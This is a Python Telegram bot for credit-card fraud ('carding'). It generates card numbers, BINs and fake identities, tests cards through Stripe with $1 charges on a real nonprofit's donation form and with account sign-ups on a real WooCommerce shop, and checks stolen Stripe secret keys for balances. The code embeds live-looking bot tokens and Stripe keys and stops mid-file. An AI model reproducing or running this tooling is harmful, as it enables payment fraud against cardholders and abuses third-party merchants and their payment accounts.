#!/usr/bin/env python
import os
import random
import requests
import logging
import asyncio
import re
import json
import time
import uuid
import urllib.parse
import hmac
import hashlib
import base64
from datetime import datetime
from fake_useragent import UserAgent
import aiohttp
from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes,
    ConversationHandler
)
from telegram.error import Forbidden, NetworkError
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot token
BOT_TOKEN = "7646562599:AAFxT8lHyAN7kjxQN737UA1diilkC6v3ai4"

# API Constants
STRIPE_PK = "pk_live_sd4VzXOpmDU8DIdWT77qHT1q"
RANDOM_USER_API = "https://randomuser.me/api/?nat=us"
BIN_CHECKER_API = "https://bins.antipublic.cc/bins/"
STRIPE_KEY = "pk_live_51PGzH0CHkCOwzzTu9c6qvusREh4UxRGjldkEitLYyhxzMrXky5loofeHZrMni5bXOG7oTHvJ0eOImw9vlFTRRVjR009dFq9WHT"

# Global variables for user sessions
USER_SESSIONS = {}
MASS_CHECK_ACTIVE = {}
MAX_CONCURRENT_CHECKS = 50  # Adjust based on your VPS capacity

# Conversation states for BIN generation
SELECT_BIN_TYPE, SELECT_DIGITS = range(2)

# Bin types for BIN generation
BIN_TYPES = {
    '1': 'Visa 4',
    '2': 'Mastercard 5',
    '3': 'American Express 3',
    '4': 'Discover 6'
}

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

class CardChecker:
    @staticmethod
    async def check_bin(bin_number: str) -> dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{BIN_CHECKER_API}{bin_number}") as response:
                    return await response.json()
        except Exception as e:
            logger.error(f"Error checking BIN: {str(e)}")
            return None

    @staticmethod
    async def get_stripe_token(number: str, month: str, year: str, cvc: str) -> str:
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': UserAgent().random,
            'sec-ch-ua': '"Chromium";v="91", " Not;A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site'
        }
        data = {
            'card[number]': number,
            'card[cvc]': cvc,
            'card[exp_month]': month,
            'card[exp_year]': year,
            'payment_user_agent': 'stripe.js/7fa1d9b9; stripe-js-v3/7fa1d9b9',
            'time_on_page': '60914',
            'key': STRIPE_PK
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post('https://api.stripe.com/v1/tokens', headers=headers, data=data) as response:
                    if response.status == 200:
                        result = await response.json()
                        return result.get('id')
                    return None
        except Exception as e:
            logger.error(f"Error getting Stripe token: {str(e)}")
            return None

    @staticmethod
    async def process_payment(token: str, first_name: str, last_name: str) -> dict:
        headers = {
            'Accept': '*/*',
            'Content-Type': 'application/json',
            'Origin': 'https://rhcollaborative.org',
            'User-Agent': UserAgent().random
        }
        params = {
            'account_id': 'act_f5d15c354806',
            'donation_type': 'cc',
            'amount_in_cents': '100',
            'form_id': 'frm_3fe8af6a5f28',
        }
        json_data = {
            'first_name': first_name,
            'last_name': last_name,
            'email': f"{first_name.lower()}.{last_name.lower()}@example.com",
            'payment_auth': '{"stripe_token":"' + token + '"}',
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post('https://api.donately.com/v2/donations', 
                                      params=params, headers=headers, json=json_data) as response:
                    return await response.json()
        except Exception as e:
            logger.error(f"Error processing payment: {str(e)}")
            return {"error": str(e)}

    @staticmethod
    async def visit_website(cc_number, exp_month, exp_year, cvc):
        try:
            async with aiohttp.ClientSession() as session:
                # Generate random user credentials
                user_id = random.randint(9999, 574545)
                username = f"cristnik1{user_id}"
                email = f"cristnik1{user_id}@mml.com"

                # First request to get register nonce
                headers = {
                    'User-Agent': UserAgent().random,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1',
                }

                async with session.get('https://bombayonthebeach.co/my-account/', headers=headers) as response:
                    response_text = await response.text()
                    soup = BeautifulSoup(response_text, 'html.parser')
                    nonce_input = soup.find('input', {'id': 'woocommerce-register-nonce'})
                    if not nonce_input:
                        return {
                            'status': 'error',
                            'message': 'Could not find registration nonce',
                            'card': f'{cc_number[:6]}******{cc_number[-4:]}',
                            'expiry': f'{exp_month}/{exp_year}'
                        }
                    register_nonce = nonce_input['value']

                    # Register the user
                    headers = {
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Cache-Control': 'max-age=0',
                        'Connection': 'keep-alive',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://bombayonthebeach.co',
                        'Referer': 'https://bombayonthebeach.co/my-account/',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-User': '?1',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': UserAgent().random,
                    }

                    data = {
                        'email': email,
                        'email_2': '',
                        'mailchimp_woocommerce_newsletter': '1',
                        'wc_order_attribution_source_type': 'typein',
                        'wc_order_attribution_referrer': '(none)',
                        'wc_order_attribution_utm_campaign': '(none)',
                        'wc_order_attribution_utm_source': '(direct)',
                        'wc_order_attribution_utm_medium': '(none)',
                        'wc_order_attribution_utm_content': '(none)',
                        'wc_order_attribution_utm_id': '(none)',
                        'wc_order_attribution_utm_term': '(none)',
                        'wc_order_attribution_utm_source_platform': '(none)',
                        'wc_order_attribution_utm_creative_format': '(none)',
                        'wc_order_attribution_utm_marketing_tactic': '(none)',
                        'wc_order_attribution_session_entry': 'https://bombayonthebeach.co/my-account/',
                        'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'wc_order_attribution_session_pages': '4',
                        'wc_order_attribution_session_count': '3',
                        'wc_order_attribution_user_agent': UserAgent().random,
                        'woocommerce-register-nonce': register_nonce,
                        '_wp_http_referer': '/my-account/',
                        'register': 'Register',
                    }

                    await session.post('https://bombayonthebeach.co/my-account/', headers=headers, data=data)

                    # Get payment methods page
                    headers = {
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Connection': 'keep-alive',
                        'Referer': 'https://bombayonthebeach.co/my-account/',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-User': '?1',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': UserAgent().random,
                    }

                    async with session.get('https://bombayonthebeach.co/my-account/payment-methods/', headers=headers) as response:
                        payment_page_text = await response.text()
                        add_card_nonce = gets(payment_page_text, 'add_card_nonce":"', '"')
                        if not add_card_nonce:
                            return {
                                'status': 'error',
                                'message': 'Could not find add card nonce',
                                'card': f'{cc_number[:6]}******{cc_number[-4:]}',
                                'expiry': f'{exp_month}/{exp_year}'
                            }

                        # Create payment method with Stripe
                        headers = {
                            'Accept': 'application/json',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Connection': 'keep-alive',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Origin': 'https://js.stripe.com',
                            'Referer': 'https://js.stripe.com/',
                            'Sec-Fetch-Dest': 'empty',
                            'Sec-Fetch-Mode': 'cors',
                            'Sec-Fetch-Site': 'same-site',
                            'User-Agent': UserAgent().random,
                        }

                        data = {
                            'type': 'card',
                            'billing_details[name]': 'wilam ougth',
                            'billing_details[email]': email,
                            'card[number]': cc_number,
                            'card[cvc]': cvc,
                            'card[exp_month]': exp_month,
                            'card[exp_year]': exp_year,
                            'guid': str(uuid.uuid4()),
                            'muid': str(uuid.uuid4()),
                            'sid': str(uuid.uuid4()),
                            'payment_user_agent': 'stripe.js/5d3c74e219; stripe-js-v3/5d3c74e219; split-card-element',
                            'referrer': 'https://bombayonthebeach.co',
                            'time_on_page': str(random.randint(500000, 700000)),
                            'key': 'pk_live_UqbFqD1q02UEq0bi03lomg8z00Ab2Knip7',
                        }

                        async with session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data) as response:
                            response_json = await response.json()
                            if 'id' in response_json:
                                payment_method_id = response_json['id']

                                # Finalize the setup
                                headers = {
                                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                                    'Accept-Language': 'en-US,en;q=0.9',
                                    'Connection': 'keep-alive',
                                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                    'Origin': 'https://bombayonthebeach.co',
                                    'Referer': 'https://bombayonthebeach.co/my-account/add-payment-method/',
                                    'Sec-Fetch-Dest': 'empty',
                                    'Sec-Fetch-Mode': 'cors',
                                    'Sec-Fetch-Site': 'same-origin',
                                    'User-Agent': UserAgent().random,
                                    'X-Requested-With': 'XMLHttpRequest',
                                }

                                params = {
                                    'wc-ajax': 'wc_stripe_create_setup_intent',
                                }

                                data = {
                                    'stripe_source_id': payment_method_id,
                                    'nonce': add_card_nonce,
                                }

                                async with session.post('https://bombayonthebeach.co/', params=params, headers=headers, data=data) as final_response:
                                    final_text = await final_response.text()
                                    if '"result":"success"' in final_text.lower():
                                        return {
                                            'status': 'success',
                                            'message': 'Card successfully validated',
                                            'card': f'{cc_number[:6]}******{cc_number[-4:]}',
                                            'expiry': f'{exp_month}/{exp_year}',
                                            'brand': response_json.get('card', {}).get('brand', 'Unknown'),
                                            'country': response_json.get('card', {}).get('country', 'Unknown')
                                        }
                                    else:
                                        error_msg = gets(final_text, '"message":"', '"') or final_text[:200]
                                        return {
                                            'status': 'failed',
                                            'message': error_msg,
                                            'card': f'{cc_number[:6]}******{cc_number[-4:]}',
                                            'expiry': f'{exp_month}/{exp_year}'
                                        }
                            else:
                                error_msg = response_json.get('error', {}).get('message', 'Unknown error')
                                return {
                                    'status': 'failed',
                                    'message': error_msg,
                                    'card': f'{cc_number[:6]}******{cc_number[-4:]}',
                                    'expiry': f'{exp_month}/{exp_year}'
                                }
        except Exception as e:
            logger.error(f"Error in visit_website: {str(e)}")
            return {
                'status': 'error',
                'message': str(e),
                'card': f'{cc_number[:6]}******{cc_number[-4:]}' if cc_number else 'N/A',
                'expiry': f'{exp_month}/{exp_year}' if exp_month and exp_year else 'N/A'
            }

class Commands:
    @staticmethod
    async def is_registered(user_id: int) -> bool:
        try:
            with open('registered_users.txt', 'r') as f:
                registered_users = f.read().splitlines()
                return str(user_id) in registered_users
        except FileNotFoundError:
            return False

    @staticmethod
    async def register_user(user_id: int) -> None:
        with open('registered_users.txt', 'a') as f:
            f.write(f"{user_id}\n")

    @staticmethod
    async def register_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if await Commands.is_registered(user_id):
            await update.message.reply_text("You are already registered! ✅")
            return

        await Commands.register_user(user_id)
        await update.message.reply_text(
            "✅ Registration successful!\n"
            "You can now use all bot features.\n"
            "Type /start to begin!"
        )

    @staticmethod
    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if not await Commands.is_registered(user_id):
            await update.message.reply_text(
                "❗️ You need to register first to use this bot!\n"
                "Send /register to register."
            )
            return

        keyboard = [
            [InlineKeyboardButton("Commands List 📋", callback_data='cmds')],
            [InlineKeyboardButton("Generate Random User 👤", callback_data='random_user')],
            [InlineKeyboardButton("Check Cards 💳", callback_data='cards')],
            [InlineKeyboardButton("BIN Tools 🔢", callback_data='bin_tools')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Welcome to the Multi-Purpose Bot!\n"
            "Created by @mumirudarkside\n"
            "Join: https://t.me/addlist/CdzXIdzTkZc4ZjNl",
            reply_markup=reply_markup
        )

    @staticmethod
    async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        keyboard = [
            [InlineKeyboardButton("Stripe", callback_data='stripe')],
            [InlineKeyboardButton("BIN Tools", callback_data='bin_tools')],
            [InlineKeyboardButton("Other Options", callback_data='other')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        msg = update.callback_query.message if update.callback_query else update.message
        await msg.reply_text('Please choose an option:', reply_markup=reply_markup)

    @staticmethod
    async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        query = update.callback_query
        await query.answer()

        if query.data == 'random_user':
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(RANDOM_USER_API) as response:
                        data = (await response.json())['results'][0]
                        user_info = f"""👤 Random User Generated:
▬▬▬▬▬▬▬▬
📛 Name: {data['name']['first']} {data['name']['last']}
📧 Email: {data['email']}
📱 Phone: {data['phone']}
📍 Location: {data['location']['city']}, {data['location']['state']}
🏠 Address: {data['location']['street']['number']} {data['location']['street']['name']}
📮 Postcode: {data['location']['postcode']}
🎂 DOB: {data['dob']['date'].split('T')[0]}
🆔 Username: {data['login']['username']}
🔑 Password: {data['login']['password']}"""

                        keyboard = [
                            [InlineKeyboardButton("🔄 Generate Another", callback_data='random_user')],
                            [InlineKeyboardButton("⬅️ Back", callback_data='back')],
                            [InlineKeyboardButton("❌ Close", callback_data='close')]
                        ]
                        reply_markup = InlineKeyboardMarkup(keyboard)
                        await query.edit_message_text(text=user_info, reply_markup=reply_markup)
            except Exception as e:
                await query.edit_message_text(f"Error generating random user: {str(e)}")

        elif query.data == 'stripe':
            keyboard = [
                [InlineKeyboardButton("⬅️ Back", callback_data='back')],
                [InlineKeyboardButton("❌ Close", callback_data='close')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            response_text = (
                "》/svv - SK Based 1$ | [On ✅]\n"
                "》/msvv - SK Based Mass 1$ | [off ❌]\n"
                "》/st - stripe 1$ check [On ✅]\n"
                "》/mst - mass check stripe 1$ [On ✅]\n"
                "》/sk - Check Stripe Key [On ✅]\n"
                "》/stt - SK auth check | [On ✅]\n"
                "》/mstt - Stripe auth mass Check [On ✅]\n"
            )
            await query.edit_message_text(text=response_text, reply_markup=reply_markup)

        elif query.data == 'bin_tools':
            keyboard = [
                [InlineKeyboardButton("Generate BINs", callback_data='gbin')],
                [InlineKeyboardButton("Check BINs", callback_data='bin')],
                [InlineKeyboardButton("Generate CCs", callback_data='gen')],
                [InlineKeyboardButton("⬅️ Back", callback_data='back')],
                [InlineKeyboardButton("❌ Close", callback_data='close')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            response_text = "BIN Tools Menu:"
            await query.edit_message_text(text=response_text, reply_markup=reply_markup)

        elif query.data == 'gbin':
            await query.edit_message_text("Use /gbin <amount> to generate BINs")
            
        elif query.data == 'bin':
            await query.edit_message_text("Use /bin to check BINs")
            
        elif query.data == 'gen':
            await query.edit_message_text("Use /gen <bin> <amount> to generate CCs")

        elif query.data == 'cmds':
            keyboard = [
                [InlineKeyboardButton("Stripe", callback_data='stripe')],
                [InlineKeyboardButton("BIN Tools", callback_data='bin_tools')],
                [InlineKeyboardButton("Other Options", callback_data='other')],
                [InlineKeyboardButton("❌ Close", callback_data='close')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text('Please choose an option:', reply_markup=reply_markup)
            
        elif query.data == 'close':
            particle_msg = "❄️ ⭐️ 💫 ✨ 🌟\n   Goodbye!\n❄️ ⭐️ 💫 ✨ 🌟"
            await query.edit_message_text(text=particle_msg)
            # Wait briefly to show animation then delete
            await asyncio.sleep(1)
            await query.message.delete()
            
        elif query.data == 'back':
            keyboard = [
                [InlineKeyboardButton("Commands List 📋", callback_data='cmds')],
                [InlineKeyboardButton("Generate Random User 👤", callback_data='random_user')],
                [InlineKeyboardButton("Check Cards 💳", callback_data='cards')],
                [InlineKeyboardButton("BIN Tools 🔢", callback_data='bin_tools')],
                [InlineKeyboardButton("❌ Close", callback_data='close')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                text="Welcome to the Multi-Purpose Bot!\n"
                     "Created by @mumirudarkside\n"
                     "Join: https://t.me/addlist/CdzXIdzTkZc4ZjNl",
                reply_markup=reply_markup
            )

    @staticmethod
    async def gbin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        try:
            amount = int(context.args[0])
            if amount <= 0:
                await update.message.reply_text("Please provide a positive number greater than 0.")
                return ConversationHandler.END
                
            context.user_data['amount'] = amount
            reply_text = "Which BIN type do you want?\n"
            for key, value in BIN_TYPES.items():
                reply_text += f"{key}. {value}\n"
            
            await update.message.reply_text(reply_text)
            return SELECT_BIN_TYPE
            
        except (IndexError, ValueError):
            await update.message.reply_text("Usage: /gbin <amount>")
            return ConversationHandler.END

    @staticmethod
    async def select_bin_type(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        choice = update.message.text.strip()
        if choice not in BIN_TYPES:
            await update.message.reply_text("Invalid choice. Please select a number from the options.")
            return SELECT_BIN_TYPE
            
        bin_prefix = BIN_TYPES[choice].split()[-1]
        context.user_data['bin_prefix'] = bin_prefix
        await update.message.reply_text("How many digits do you need in the BIN? (5 or 6)")
        return SELECT_DIGITS

    @staticmethod
    async def select_digits(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        digits = update.message.text.strip()
        if digits not in ['5', '6']:
            await update.message.reply_text("Please enter either 5 or 6 for the digit count.")
            return SELECT_DIGITS
            
        digits = int(digits)
        amount = context.user_data['amount']
        bin_prefix = context.user_data['bin_prefix']
        
        bins = []
        for _ in range(amount):
            remaining_digits = digits - len(bin_prefix)
            random_part = ''.join([str(random.randint(0, 9)) for _ in range(remaining_digits)])
            bins.append(bin_prefix + random_part)
        
        # Send as text file if more than 10, otherwise as message
        if amount <= 10:
            await update.message.reply_text("\n".join(bins))
        else:
            with open('bins.txt', 'w') as f:
                f.write("\n".join(bins))
            with open('bins.txt', 'rb') as f:
                await update.message.reply_document(document=f, filename='bins.txt')
            os.remove('bins.txt')
        
        return ConversationHandler.END

    @staticmethod
    async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        context.user_data['bins_to_check'] = []
        await update.message.reply_text("Please send me BINs to check (one per line) or a .txt file with BINs.")

    @staticmethod
    async def handle_bin_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if update.message.document:
            # Handle file upload
            file = await update.message.document.get_file()
            await file.download_to_drive('bins_to_check.txt')
            with open('bins_to_check.txt', 'r') as f:
                bins = [line.strip() for line in f.readlines() if line.strip()]
            os.remove('bins_to_check.txt')
        else:
            # Handle text input
            bins = [line.strip() for line in update.message.text.split('\n') if line.strip()]
        
        context.user_data['bins_to_check'] = bins
        await update.message.reply_text(f"Received {len(bins)} BIN(s) to check. Send /mbin to process them.")

    @staticmethod
    async def mbin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if 'bins_to_check' not in context.user_data or not context.user_data['bins_to_check']:
            await update.message.reply_text("No BINs to check. Please send BINs first.")
            return
        
        bins = context.user_data['bins_to_check']
        results = []
        
        for bin_num in bins:
            if len(bin_num) < 6:
                results.append(f"⚠️ Invalid BIN format for {bin_num}. BIN must be at least 6 digits.")
                continue
                
            first_six = bin_num[:6]
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(f"https://bins.antipublic.cc/bins/{first_six}") as response:
                        data = await response.json()
                
                if data.get('error'):
                    results.append(f"⚠️ Invalid BIN: {first_six}")
                else:
                    result_text = (
                        f"▐ 𝗩𝗔𝗟𝗜𝗗 𝗕𝗜𝗡 ✅️ ▐\n\n"
                        f"𝗕𝗜𝗡 ⇾ {first_six}\n\n"
                        f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {data.get('brand', 'N/A')}\n"
                        f"𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆: {data.get('currency', 'N/A')}\n"
                        f"𝗕𝗮𝗻𝗸: {data.get('bank', 'N/A')}\n"
                        f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {data.get('country', 'N/A')} ({data.get('country_code', 'N/A')})\n"
                        f"𝗥𝗲𝗾 ⌁ @{update.message.from_user.username}"
                    )
                    results.append(result_text)
                    
            except Exception as e:
                results.append(f"⚠️ Error checking BIN {first_six}: {str(e)}")
        
        # Send results (in chunks if too long)
        chunk_size = 5
        for i in range(0, len(results), chunk_size):
            chunk = results[i:i+chunk_size]
            await update.message.reply_text("\n\n".join(chunk))

    @staticmethod
    async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        try:
            if len(context.args) < 2:
                raise ValueError
            
            bin_num = context.args[0]
            amount = int(context.args[1])
            
            if amount <= 0:
                await update.message.reply_text("Amount must be greater than 0.")
                return
                
            # Determine card length based on BIN
            if bin_num.startswith('3'):
                card_length = 15  # Amex
            elif bin_num.startswith(('30', '36', '38', '39')):
                card_length = 14  # Diners Club (some)
            else:
                card_length = 16  # Visa, MC, Discover, etc.
                
            # Generate cards
            cards = []
            for _ in range(amount):
                remaining_length = card_length - len(bin_num)
                card_number = bin_num + ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
                exp_month = str(random.randint(1, 12)).zfill(2)
                exp_year = str(random.randint(2023, 2030))
                cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
                cards.append(f"{card_number}|{exp_month}|{exp_year}|{cvv}")
            
            # Prepare info (will be empty as we don't have API for this in /gen)
            info_text = (
                f"Card Generator  \n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"[ᛋ] Bin: {bin_num}xxxx|{random.randint(1,12):02d}|20{random.randint(23,30)}|rnd\n"
                f"━━━━━━━━━━━━━━━━━\n"
            )
            
            if amount <= 10:
                # Send as formatted message
                message = info_text + "\n".join(cards) + (
                    f"\n━━━━━━━━━━━━━━━━━\n"
                    f"[ᛋ] Info: \n"
                    f"[ᛋ] Bank: \n"
                    f"[ᛋ] Country: \n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"[ᛋ] Generate by: @{update.message.from_user.username}"
                )
                await update.message.reply_text(message)
            else:
                # Send as file
                with open('cards.txt', 'w') as f:
                    f.write("\n".join(cards))
                with open('cards.txt', 'rb') as f:
                    await update.message.reply_document(
                        document=f,
                        filename='cards.txt',
                        caption=f"Generated {amount} cards from BIN {bin_num}\nGenerated by: @{update.message.from_user.username}"
                    )
                os.remove('cards.txt')
                
        except (IndexError, ValueError):
            await update.message.reply_text("Usage: /gen <bin> <amount>")

    @staticmethod
    async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        await update.message.reply_text('Operation cancelled.')
        return ConversationHandler.END

    @staticmethod
    async def generate_random_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(RANDOM_USER_API) as response:
                    data = (await response.json())['results'][0]

                    user_info = f"""👤 Random User Generated:
▬▬▬▬▬▬▬▬
📛 Name: {data['name']['first']} {data['name']['last']}
📧 Email: {data['email']}
📱 Phone: {data['phone']}
📍 Location: {data['location']['city']}, {data['location']['state']}
🏠 Address: {data['location']['street']['number']} {data['location']['street']['name']}
📮 Postcode: {data['location']['postcode']}
🎂 DOB: {data['dob']['date'].split('T')[0]}
🆔 Username: {data['login']['username']}
🔑 Password: {data['login']['password']}"""

                    msg = update.callback_query.message if update.callback_query else update.message
                    await msg.reply_text(user_info)
        except Exception as e:
            error_msg = f"Error generating random user: {str(e)}"
            msg = update.callback_query.message if update.callback_query else update.message
            await msg.reply_text(error_msg)

    @staticmethod
    async def check_sk(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not context.args:
            await update.message.reply_text("Please provide SK key")
            return

        sk_key = context.args[0]
        if not re.match(r"sk_(test|live)_[A-Za-z0-9]+", sk_key):
            await update.message.reply_text("[❌] Error → Invalid SK Key format!")
            return

        try:
            auth = base64.b64encode(sk_key.encode()).decode()
            headers = {'Authorization': f'Basic {auth}', 'User-Agent': UserAgent().random}

            async with aiohttp.ClientSession() as session:
                # Get balance info
                async with session.get('https://api.stripe.com/v1/balance', headers=headers) as balance_response:
                    balance_data = await balance_response.json()

                # Get account info
                async with session.get('https://api.stripe.com/v1/account', headers=headers) as account_response:
                    account_data = await account_response.json()

            if 'error' in balance_data or 'error' in account_data:
                error_msg = balance_data.get('error', {}).get('message') or account_data.get('error', {}).get('message', 'Invalid SK Key')
                await update.message.reply_text(f"[❌] Error → {error_msg}")
                return

            masked_sk = sk_key[:12] + '_SWDQYL_' + sk_key[-4:]

            msg = f"""━━━━━━━━━━━━━━━  
   𝙎𝙩𝙖𝙩𝙪𝙨 ⌁  
━━━━━━━━━━━━━━━  

🚀 𝙎𝙠 ⌁ {masked_sk}

🆔 𝙉𝙖𝙢𝙚: {account_data.get('business_profile', {}).get('name', 'N/A')}
🌍 𝙎𝙞𝙩𝙚: {account_data.get('business_profile', {}).get('url', 'N/A')}
🔢 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙄𝘿: {account_data.get('id', 'N/A')}
🏳️ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮: {account_data.get('country', 'N/A')}
💰 𝘾𝙪𝙧𝙧𝙚𝙣𝙘𝙮: {balance_data['available'][0]['currency'].upper()}
📧 𝙈𝙖𝙞𝙡: {account_data.get('email', 'N/A')}

💳 𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝘽𝙖𝙡𝙖𝙣𝙘𝙚: {balance_data['available'][0]['amount']}
⏳ 𝙋𝙚𝙣𝙙𝙞𝙣𝙜: {balance_data['pending'][0]['amount']}

🔹 �𝙖𝙮𝙢𝙚𝙣𝙩 𝙈𝙚𝙩𝙝𝙤𝙙 𝙎𝙩𝙖𝙩𝙪𝙨: {'✅ Active' if account_data.get('capabilities', {}).get('card_payments') == 'active' else '❌ Inactive'}
🔹 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙎𝙩𝙖𝙩𝙪𝙨: {'✅ Active' if account_data.get('charges_enabled') else '❌ Inactive'}
🔹 𝘾𝙝𝙖𝙧𝙜𝙚𝙨 𝙀𝙣𝙖𝙗𝙡𝙚𝙙: {'✅ Yes' if account_data.get('charges_enabled') else '❌ No'}

━━━━━━━━━━━━━━━ 
𝗥𝗲𝗾 𝗯𝘆 ➜ @{update.effective_user.username or 'N/A'}
━━━━━━━━━━━━━━━"""

            await update.message.reply_text(msg)
        except Exception as e:
            await update.message.reply_text("[❌] Error → Invalid SK Key")

    @staticmethod
    async def check_card(cc_data: str, update: Update) -> str:
        try:
            number, month, year, cvc = cc_data.split("|")

            # Get random user data for the transaction
            async with aiohttp.ClientSession() as session:
                async with session.get(RANDOM_USER_API) as response:
                    user_data = (await response.json())['results'][0]
                    first_name = user_data['name']['first']
                    last_name = user_data['name']['last']

            # Get Stripe token
            stripe_token = await CardChecker.get_stripe_token(number, month, year, cvc)
            if not stripe_token:
                return "❌ Error: Could not get token"

            # Process payment
            payment_result = await CardChecker.process_payment(stripe_token, first_name, last_name)
            result = payment_result.get('message', 'Unknown response')

            # Get BIN info
            bin_info = await CardChecker.check_bin(number[:6])

            # Format response
            response = f"""━━━━━━━━━━━━━━━
📌 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 🔥
━━━━━━━━━━━━━━━

💳 𝗖𝗮𝗿𝗱 ➜ {number}|{month}|{year}|{cvc}
🚪 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ Stripe 1$
📡 𝗦𝘁𝗮𝘁𝘂𝘀 ➜ {'✅' if 'success' in result.lower() else '❌'}
⚡ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result}

━━━━━━━━━━━━━━━"""

            if bin_info:
                response += f"""
━━━━━━━━━━━━━━━
𝗕𝗶𝗻 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻
━━━━━━━━━━━━━━━

🔍 𝗕𝗶𝗻 ➜ {number[:6]}
🏷️ 𝗕𝗿𝗮𝗻𝗱 ➜ {bin_info.get('brand', 'N/A')}
🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➜ {bin_info.get('country_code', 'N/A')}
🇨🇴 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 𝗡𝗮𝗺𝗲 ➜ {bin_info.get('country_name', 'N/A')}
🏦 𝗕𝗮𝗻𝗸 ➜ {bin_info.get('bank', 'N/A')}
📶 𝗟𝗲𝘃𝗲𝗹 ➜ {bin_info.get('level', 'N/A')}
📌 𝗧𝘆𝗽𝗲 ➜ {bin_info.get('type', 'N/A')}

━━━━━━━━━━━━━━━
𝗥𝗲𝗾 ⌁ @{update.effective_user.username or 'N/A'}
𝗗𝗲𝘃𝗕𝘆 ⌁ @mumiru
━━━━━━━━━━━━━━━"""

            return response

        except Exception as e:
            return f"Error: {str(e)}"

    @staticmethod
